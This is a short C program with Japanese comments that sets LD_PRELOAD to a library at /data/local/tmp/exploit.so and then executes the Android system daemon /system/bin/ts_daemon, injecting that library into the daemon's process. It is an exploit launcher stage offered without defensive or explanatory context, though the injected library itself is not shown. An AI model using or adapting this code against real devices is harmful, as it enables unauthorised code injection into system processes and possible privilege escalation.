#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv, char **envp) {
    // 既存の環境変数に LD_PRELOAD を追加/上書き
    // exploit.so は同一ディレクトリ、または絶対パスで指定
    setenv("LD_PRELOAD", "/data/local/tmp/exploit.so", 1);

    // デバッグ用：LD_DEBUG を有効にしてリンク状況を出力することも可能
    // setenv("LD_DEBUG", "libs", 1); 

    // ts_daemon を実行（/system/bin/ に存在）
    char *cmd = "/system/bin/ts_daemon";
    char *args[] = { cmd, NULL };

    execve(cmd, args, environ);

    // execve 失敗時のエラーハンドリング
    perror("execve failed");
    return 1;
}
